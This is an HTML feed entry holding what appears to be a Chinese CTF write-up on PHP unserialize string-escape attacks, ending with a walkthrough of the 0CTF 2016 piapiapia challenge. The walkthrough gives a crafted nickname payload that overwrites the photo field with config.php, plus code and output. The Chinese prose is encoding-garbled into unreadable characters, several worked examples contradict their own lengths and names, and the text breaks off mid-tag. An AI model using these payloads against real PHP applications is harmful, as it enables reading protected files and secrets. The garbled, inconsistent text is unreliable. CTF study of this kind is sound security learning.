    <content type="html"><![CDATA[<h2 id="å¸¸è§çš„å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å¸¸è§çš„å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å¸¸è§çš„å­—ç¬¦ä¸²é€ƒé€¸"></a>å¸¸è§çš„å­—ç¬¦ä¸²é€ƒé€¸</h2><h4 id="åŸºæœ¬çŸ¥è¯†"><a href="#åŸºæœ¬çŸ¥è¯†" class="headerlink" title="åŸºæœ¬çŸ¥è¯†"></a>åŸºæœ¬çŸ¥è¯†</h4><p>1.<strong>åºåˆ—åŒ–å­—ç¬¦ä¸²å¿…é¡»ä½¿ç”¨å•å¼•å· <code>&#39;</code>  åŒ…è£¹</strong>ã€‚PHP çš„åºåˆ—åŒ–æ ¼å¼è¦æ±‚å­—ç¬¦ä¸²éƒ¨åˆ†ä½¿ç”¨åŒå¼•å·ï¼Œå¦åˆ™ä¼šå¯¼è‡´ <code>unserialize()</code> æŠ¥é”™ã€‚</p><p>2.å†æœ‰ç‰¹å®šçš„é’ˆå¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å˜é•¿å˜çŸ­çš„æƒ…å†µä¸‹</p><ul><li>åœ¨phpä¸­ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–ï¼Œä¾‹å¦‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#è¾“å‡ºç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array(2)&#123;</span><br><span class="hljs-comment">[0]=&gt; string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [1]=&gt; string(6) &quot;mikasa&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæŒ‰ç…§æˆ‘ä»¬çš„æ­£å¸¸ç†è§£ï¼Œä¸Šé¢ä¾‹å­ä¸­å˜é‡<code>$str</code>æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼ŒæŒ‰ç†æ¥è¯´æ”¹å˜å…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚ä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚å¦‚æœåœ¨<code>$str</code>ç»“å°¾çš„èŠ±æ‹¬å·ååŠ ä¸€äº›å­—ç¬¦</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;abc&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#è¾“å‡ºç»“æœä¾ç„¶å’Œä¸Šé¢çš„ç›¸åŒ</span><br></code></pre></td></tr></table></figure><ul><li>è¿™è¯´æ˜äº†ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦ï¼ˆå¦‚èŠ±æ‹¬å·å¤–çš„abcï¼‰éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€</li></ul><hr><h4 id="php-ååºåˆ—åŒ–-çš„å‡ å¤§ç‰¹æ€§"><a href="#php-ååºåˆ—åŒ–-çš„å‡ å¤§ç‰¹æ€§" class="headerlink" title="php[ååºåˆ—åŒ–]çš„å‡ å¤§ç‰¹æ€§"></a>php[ååºåˆ—åŒ–]çš„å‡ å¤§ç‰¹æ€§</h4><ul><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œæ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰å¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„<ul><li>æ³¨æ„ç‚¹: å¾ˆå®¹æ˜“ä»¥ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯<code>&#125;</code>ç»“å°¾ï¼Œå®é™…ä¸Šåºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯ä»¥<code>;&#125;</code>ç»“å°¾çš„ï¼Œä½†å¯¹è±¡åºåˆ—åŒ–æ˜¯ç›´æ¥<code>&#125;</code>ç»“å°¾</li><li>phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªç»“å°¾ç¬¦å®ç°çš„</li></ul></li><li>å½“é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™</li></ul><hr><h4 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h4><p>ååºåˆ—åŒ–ä¹‹æ‰€ä»¥å­˜åœ¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæœ€ä¸»è¦çš„åŸå› æ˜¯ä»£ç ä¸­å­˜åœ¨é’ˆå¯¹åºåˆ—åŒ–ï¼ˆserialize()ï¼‰åçš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤æ“ä½œï¼ˆå˜å¤šæˆ–è€…å˜å°‘ï¼‰ã€‚</p><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸é—®é¢˜æ ¹æ®è¿‡æ»¤å‡½æ•°ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼Œå­—ç¬¦æ•°å¢å¤šå’Œå­—ç¬¦æ•°å‡å°‘</p><h5 id="å­—ç¬¦æ•°å¢å¤š"><a href="#å­—ç¬¦æ•°å¢å¤š" class="headerlink" title="å­—ç¬¦æ•°å¢å¤š"></a>å­—ç¬¦æ•°å¢å¤š</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter($_GET[&#x27;user&#x27;]);</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é—®ï¼šå¦‚æœæˆ‘èƒ½æ§åˆ¶è¿›è¡Œååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œè¯¥å¦‚ä½•ä½¿var_dumpæ‰“å°å‡ºæ¥çš„passwordå¯¹åº”çš„å€¼æ˜¯<code>654321</code>ï¼Œè€Œä¸æ˜¯<code>123456</code>ï¼Ÿ</p><ul><li>æ­£å¸¸æƒ…å†µä¸‹ååºåˆ—åŒ–å­—ç¬¦ä¸²**$str1**çš„å€¼ä¸º<code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>é‚£ä¹ˆæŠŠusernameçš„å€¼å˜ä¸º<code>adminxxx</code>ï¼Œå½“å®Œæˆåºåˆ—åŒ–ï¼Œfilterå‡½æ•°å¤„ç†åçš„ç»“æœä¸º<code>a:2:&#123;i:0;s:8:&quot;adminyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>å› ä¸ºæ¯”ä¹‹å‰å¤šäº†ä¸‰ä¸ªå­—ç¬¦ï¼Œååºåˆ—åŒ–æ—¶è‚¯å®šæ˜¯ä¼šå¤±è´¥çš„ï¼</li><li>æ‰€ä»¥ï¼Œå¯ä»¥åˆ©ç”¨å¤šå‡ºæ¥çš„å­—ç¬¦ä¸²åšä¸€äº›åäº‹ï¼Ÿ</li></ul></li><li>æƒ³è¦passwordæ˜¯<code>654321</code>ï¼Œååºåˆ—åŒ–åŒ–å‰çš„å­—ç¬¦ä¸²è¦æ˜¯ <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>å¦‚æœè¯´æœ€åçš„æ˜¯<ul><li><code>a:2:&#123;i:0;s:25:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>é‚£ä¹ˆå¯†ç å°±ä¼šå˜æˆ654321ï¼Œ<code>;&#125;</code>ä¼šè¢«å¿½ç•¥</li><li>è¦æ„å»ºçš„å­—æ®µæ˜¯ <code>&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code> æ•°ä¸€ä¸‹æ˜¯20ä¸ªå­—ç¬¦ï¼Œ</li><li>ä¸€ä¸ªxä¼šå¯¼è‡´å¤šå‡ºä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åŠ ä¸Š20ä¸ªxï¼Œ<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>éƒ¨åˆ†çš„å†…å®¹ä¼šè¢«å½“ä½œæ— æ•ˆéƒ¨åˆ†è¢«å¿½ç•¥</li></ul></li><li>æ‰€ä»¥æœ€ç»ˆè¾“å…¥æ˜¯<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>filterä¹‹åï¼Œä¼šå˜ä¸º</li><li><code>a:2:&#123;i:0;s:45:&quot;adminyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li></ul></li></ul><h5 id="å­—ç¬¦ä¸²å‡å°‘"><a href="#å­—ç¬¦ä¸²å‡å°‘" class="headerlink" title="å­—ç¬¦ä¸²å‡å°‘"></a>å­—ç¬¦ä¸²å‡å°‘</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter(serialize($_GET[&#x27;user&#x27;]));</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é—®ï¼šå¦‚æœæˆ‘èƒ½æ§åˆ¶è¿›è¡Œååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œè¯¥å¦‚ä½•ä½¿var_dumpæ‰“å°å‡ºæ¥çš„passwordå¯¹åº”çš„å€¼æ˜¯<code>654321</code>ï¼Œè€Œä¸æ˜¯<code>123456</code>ï¼Ÿ</p><ul><li>æ­£å¸¸æƒ…å†µä¸‹ååºåˆ—åŒ–å­—ç¬¦ä¸²**$str1**çš„å€¼ä¸º <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>é‚£ä¹ˆæŠŠusernameçš„å€¼å˜ä¸º<code>adminxxxxxx</code>ï¼Œå½“å®Œæˆåºåˆ—åŒ–ï¼Œfilterå‡½æ•°å¤„ç†åçš„ç»“æœä¸º<code>a:2:&#123;i:0;s:11:&quot;adminyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>å› ä¸ºæ¯”ä¹‹å‰å°‘äº†ä¸‰ä¸ªå­—ç¬¦ï¼Œååºåˆ—åŒ–æ—¶è‚¯å®šæ˜¯ä¼šå¤±è´¥çš„,<code>amdinyyy</code>çš„é•¿åº¦ä¸º8ï¼Œè¿˜ä¼šç»§ç»­å¾€åå3ä¸ªå­—ç¬¦ï¼ä½†è¿™æ ·ä¼šé€ æˆè¯­æ³•é”™è¯¯ï¼</li><li>æ‰€ä»¥ï¼Œæ˜¯å¦å¯ä»¥åˆ©ç”¨å˜åŒ–çš„å­—ç¬¦é•¿åº¦åšä¸€äº›åäº‹ï¼Ÿï¼ˆåæ‰åŸæœ‰çš„passwordå€¼ï¼Œå†æ·»åŠ æ–°å€¼ï¼ï¼‰</li></ul></li><li>æ„å»ºçš„æ³¨å…¥è¡¨è¾¾å¼æ˜¯<strong>åé¢éƒ¨åˆ†éœ€è¦å¯æ§</strong><ul><li><code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>æ‰€ä»¥è¦åæ‰çš„å†…å®¹æ˜¯<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> ä¸€å…±æ˜¯20ä¸ªå­—ç¬¦ï¼æ‰€ä»¥éœ€è¦æ·»åŠ 40ä¸ªx</li></ul></li><li>æ‰€ä»¥æœ€ç»ˆçš„è¾“å…¥æ—¶<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>filterä¹‹åï¼Œä¼šå˜ä¸º</li><li><code>a:2:&#123;i:0;s:45:&quot;mikasayyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li></ul></li></ul><h4 id="4ã€æ€»ç»“"><a href="#4ã€æ€»ç»“" class="headerlink" title="4ã€æ€»ç»“"></a>4ã€æ€»ç»“</h4><ul><li>å½“å­—ç¬¦å¢å¤šï¼šåœ¨è¾“å…¥çš„æ—¶å€™å†åŠ ä¸Šç²¾å¿ƒæ„é€ çš„å­—ç¬¦ã€‚ç»è¿‡è¿‡æ»¤å‡½æ•°ï¼Œå­—ç¬¦å˜å¤šä¹‹åï¼Œå°±æŠŠæˆ‘ä»¬æ„é€ çš„ç»™æŒ¤å‡ºæ¥ã€‚ä»è€Œå®ç°å­—ç¬¦é€ƒé€¸</li><li>å½“å­—ç¬¦å‡å°‘ï¼šåœ¨è¾“å…¥çš„æ—¶å€™å†åŠ ä¸Šç²¾å¿ƒæ„é€ çš„å­—ç¬¦ã€‚ç»è¿‡è¿‡æ»¤å‡½æ•°ï¼Œå­—ç¬¦å‡å°‘åï¼Œä¼šæŠŠåŸæœ‰çš„åæ‰ï¼Œä½¿æ„é€ çš„å­—ç¬¦å®ç°ä»£æ›¿</li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>[0CTF 2016]piapiapia</p><p>å…ˆå¸¸è§„æ“ä½œ:çœ‹æºç ï¼ŒæŸ¥çœ‹robots.txtï¼Œdisearchæ‰«æï¼ŒæŠ“åŒ…</p><p>sqlæ²¡æœ‰ååº”ï¼Œdisearchå‘ç°<a href="http://www.zipæºç æ³„éœ²/">www.zipæºç æ³„éœ²</a></p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°flagåœ¨config.phpæ–‡ä»¶é‡Œé¢ï¼Œé‚£ä¹ˆå°±éœ€è¦æ–‡ä»¶åŒ…å«</p><p>åœ¨profile.phpå†…é‡Œæœ‰å‡½æ•°file_get_content()å‡½æ•°ï¼Œæˆ‘ä»¬è¦æ„å»ºå‚æ•°ä¸ºconfig.php</p><p>è¯»æºç å‘ç°æ³¨å†Œåä¸Šä¼ çš„ç”¨æˆ·èµ„æ–™ä¼šè¢«åºåˆ—åŒ–ç„¶åå¯¹åºåˆ—åŒ–åçš„ä»£ç è¿›è¡Œè¿‡æ»¤</p><p>ä½†æ˜¯è¿‡æ»¤åå‘ç”Ÿæ›¿æ¢ç›´æ¥å­˜å‚¨ï¼Œç„¶åç›´æ¥è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°whereè¢«æ›¿æ¢åå­˜åœ¨å­—ç¬¦ä¸²é€ƒé€¸æ¼æ´ï¼ˆå˜é•¿ï¼‰</p><p>é‚£ä¹ˆå°±å¯ä»¥æŠŠphotoçš„æ–‡ä»¶åæ¢æˆconfig,php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;name&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦æ›¿æ¢æˆ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>é•¿åº¦33ä¸ªé‚£å°±è¦33ä¸ªwhere</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br>ç»“æœï¼š<br>a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;123@321.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">198</span>:<span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:5:&quot;</span>wokao<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:4:&#123;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">12345678901</span><span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">123</span>@<span class="hljs-number">321</span>.com<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;wokao&quot;</span>;&#125;<br><span class="hljs-keyword">array</span>(<span 